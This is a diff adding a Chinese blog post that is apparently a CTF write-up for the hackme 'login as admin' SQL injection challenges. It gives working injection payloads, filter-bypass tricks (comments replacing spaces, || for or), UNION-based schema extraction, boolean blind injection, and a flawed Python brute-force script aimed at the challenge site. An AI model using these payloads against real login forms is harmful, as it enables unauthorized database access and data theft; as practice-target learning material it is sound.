@@ -229,6 +229,149 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/02/sql注入（二）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zyw">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zyw">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/02/sql注入（二）/" itemprop="url">菜鸡又来玩注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-02T23:30:24+08:00">
+                2018-11-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="没错，还是我，我又来了，还是死磕hackme"><a href="#没错，还是我，我又来了，还是死磕hackme" class="headerlink" title="没错，还是我，我又来了，还是死磕hackme"></a>没错，还是我，我又来了，还是死磕hackme</h2><h2 id="这次的记录，记录一下-login-as-admin0，1系列"><a href="#这次的记录，记录一下-login-as-admin0，1系列" class="headerlink" title="这次的记录，记录一下 login as admin0，1系列"></a>这次的记录，记录一下 login as admin0，1系列</h2><p>（一）login as admin 0:<br>    查看源码，发现这里加了个过滤，具体如下：<br>    if (strstr($strl, ‘or 1=1’) || strstr($strl, ‘drop’) ||<br>        strstr($strl, ‘update’) || strstr($strl, ‘delete’)<br>    ) {<br>        return ‘’;<br>    }<br>    return str_replace(“‘“, “\‘“, $str);<br>    代码审计发现，主要是or 1=1 与“‘”被过滤（PS:菜鸡如我怎么可能都发现，过滤单引号真没看出来，这里感谢某位大佬）<br>    于是乎想到用||代替or，用转义字符代替单引号，同时注释掉密码部分，于是构造如下payload<br>    admin\’ ||1=1#<br>    于是成功注入，但是<del>~</del>~进入之后竟然说：you are not admin!<br>    WHAT！关键时刻还是Google啊，原来表中默认第一位为非admin,于是看下一位，改payload为;<br>    admin\’ ||1=1 limit 1,1#<br>    密码任意，成功进入拿到flag1</p>
+<p>注：这里有个问题，同样是构造恒等式，为什么2=2在这里不行，明明没有被过滤，还有源码中已经定义的$_GET[‘show_source’] === ‘1’<br>    为什么不能用来构造，等待大佬解答</p>
+<p>————————————————————————————————————————————————————————————————————————————————————————我是分隔线！！！</p>
+<p>（二）login as admin 0.1:<br>    同样的源码，不同的在于需要注入数据库找到flag2,关键代码如下：<br>    SELECT * FROM <code>user</code> WHERE <code>user</code> = ‘%s’ AND <code>password</code> = ‘%s’”,<br>        $_POST[‘name’],<br>        $_POST[‘password’]<br>    还是自己太弱，刚看到这个就想当然的POST误导了，一直尝试用HACKBAR传参，终以失败告终。换个方法，再输入框注入，成功<br>    在上一题中，其实admin可以不加，但这里必须加，这里还判断了是否为空的问题，构造如下payload；<br>    admin\’ and 1=2 union select 1,2,3,4 limit 0,1#<br>    此时返回2，显然2就是我们要的注入点，于是继续套路:<br>    admin\’ and 1=2 union select 1,database(),3,4 limit 0,1#<br>    此时回显login_as_admin0，这就是数据库名，继续；<br>    admin\’ and 1=2 union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=”login_as_admin0” limit 0,1),3,4 limit 0,1#<br>    得到表名：h1dden_f14g，继续;<br>    admin\’ and 1=2 union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=”h1dden_f14g” limit 0,1),3,4 limit 0,1#<br>    得到列名:the_f14g,继续；<br>    admin\’ and 1=2 union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4 limit 0,1#<br>    哈哈，这里就可以得到flag2了</p>
+<p>————————————————————————————————————————————————————————————————————————————————————————我还是分隔线！！！</p>
+<p>（三）login as admin 1:<br>    类似的题目，最大的区别是过滤了空格和1=1;<br>    if (strstr($strl, ‘ ‘) || strstr($strl, ‘1=1’) || strstr($strl, “‘’”) ||<br>        strstr($strl, ‘union select’) || strstr($strl, ‘select ‘)<br>    ) {<br>        return ‘’;<br>    }<br>    return str_replace(“‘“, “\‘“, $str);<br>    那肯定是要找东西替换空格，第一想法是：\0,可惜失败了，这个时候自然得再次向强大的Google寻求帮助，OK，使用/<strong>/完美解决<br>    下面就开始构造payload了<br>    admin\’/</strong>/or/<strong>/1&lt;2/</strong>/limit/**/1,1#<br>    于是轻松拿下第一个flag1</p>
+<p>————————————————————————————————————————————————————————————————————————————————————————没错，我就是分隔线！！！</p>
+<p>（四）login as admin 1.2；<br>    这个题目相对而言就要难很多，测试竟然没有回显，题目提示通过布尔盲注完成，于是开始恶补布尔盲注，总算还是收获了点东西；<br>    对于这个页面，主要通过登陆成功与否来进行判断。<br>    根据套路，首先肯定是要判断数据库名。于是第一步判断数据库名的长度，通过构造如下payload判断<br>    admin\’/<strong>/or/</strong>/length(database())&gt;=20<br>    如此逐步判断（使用二分法更快捷），显然可以将长度求出，最后得出为15<br>    于是下一步逐一试出这15个字母，可以通过正则表达式和ASCII，原谅我正则真的看不懂，于是选择ASCII，构造如下：<br>    admin\’/<strong>/or/</strong>/ascii(substr(database(),i,1))=j/<strong>/limit/</strong>/0,1#<br>    其中i遍历所有字母，j遍历可能的ASCII码（33-127）<br>    这里苦逼的我写的py竟然不行，只得手动查找，得到database()=”login_as_admin1”<br>    下面的步骤当然就是找出表名的长度，于是构造：<br>    admin\’/<strong>/or/</strong>/length(select/<strong>/TABLE_NAME/</strong>/from/<strong>/information_schema.TABLES/</strong>/where/<strong>/TABLE_SCHEMA=”login_as_admin1”/</strong>/limit/<strong>/0,1)&gt;=30)/</strong>/limit/<strong>/0,1#<br>    最后竟然得到了长度为32，这正是要了我的老命了，关键我的py还没用，所以只列出下一步的操作，结果只能自测了@@@<br>    admin\’/</strong>/or/<strong>/ascii(substr(select/</strong>/TABLE_NAME/<strong>/from/</strong>/information_schema.TABLES/<strong>/where/</strong>/TABLE_SCHEMA=”login_as_admin1”/<strong>/limit/</strong>/0,1),i,1)=j/<strong>/limit/</strong>/0,1#</p>
+<pre><code>下面附上我那没用的py,希望可以有大佬指点一番：(原因好像是根本没登陆进去，贼奇怪)
+import requests
+result=&quot;&quot;
+url=&quot;https://hackme.inndy.tw/login1/index.php&quot;
+for i in range(1,16):
+    for j in range(33,127):
+        user=&quot;admin\&apos;/**/or/**/ascii(substr(database(),i,1))=j/**/limit/**/0,1#&quot;
+        data={
+        &quot;name&quot;:user,&quot;password&quot;:&quot;1223&quot;
+    }
+    r=requests.post(url=url,data=data)
+    str=&quot;You are not admin!&quot;
+    if str in r.content.decode():
+        result +=chr(j)
+        break;
+print (result)
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/sql注入/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -759,7 +902,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
